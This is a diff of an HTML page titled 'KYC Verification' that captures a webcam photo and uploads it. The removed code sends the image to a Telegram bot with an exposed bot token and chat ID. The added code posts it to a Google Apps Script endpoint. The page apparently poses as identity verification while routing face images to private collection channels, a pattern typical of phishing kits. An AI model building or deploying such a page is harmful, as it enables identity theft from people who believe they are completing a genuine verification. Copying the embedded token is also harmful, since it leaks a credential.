@@ -1,18 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
     <title>KYC Verification</title>
 </head>
 <body>
     <h2>Live KYC Verification</h2>
-    <!-- Video element to display camera feed -->
     <video id="video" width="320" height="240" autoplay></video>
-    <!-- Capture button -->
     <button id="capture">Capture</button>
-    <!-- Canvas element to show captured image -->
     <canvas id="canvas" width="320" height="240"></canvas>
-    <!-- Upload button -->
     <button id="upload">Upload</button>
 
     <script>
@@ -20,31 +15,27 @@
         let canvas = document.getElementById("canvas");
         let context = canvas.getContext("2d");
 
-        // Request camera access
+        // ✅ Camera Access
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => video.srcObject = stream)
             .catch(error => alert("Camera access denied!"));
 
-        // Capture the image from the video stream
+        // ✅ Capture Image
         document.getElementById("capture").addEventListener("click", function() {
             context.drawImage(video, 0, 0, 320, 240);
         });
 
-        // Upload the captured image via Telegram bot API
+        // ✅ Upload Image to Google Drive
         document.getElementById("upload").addEventListener("click", function() {
             let imageData = canvas.toDataURL("image/png");
 
-            fetch("https://api.telegram.org/bot8110395503:AAHUyuCmSqNCjSRXIQvJP915LygZKMnZCYw/sendPhoto", {  // **Replace YOUR_BOT_TOKEN with your actual bot token**
+            fetch("https://script.google.com/macros/s/AKfycbzevC5Vel6WK-M3BUu7rqDv4dvNvmp0n03Wg0nfdFlgRVyleaVp7TnhgY-HK1wSQn5x9w/exec", {  
                 method: "POST",
-                body: JSON.stringify({
-                    chat_id: "7176956295",  // **Replace YOUR_TELEGRAM_CHAT_ID with your Telegram chat ID**
-                    photo: imageData
-                }),
+                body: JSON.stringify({ image: imageData }),
                 headers: { "Content-Type": "application/json" }
-            })
-            .then(response => response.json())
-            .then(data => alert("✅ Image sent to Telegram bot!"))
-            .catch(error => console.error(error));
+            }).then(response => response.text())
+              .then(data => alert("✅ Image uploaded! Google Drive Link: " + data))
+              .catch(error => console.error(error));
         });
     </script>
 </body>
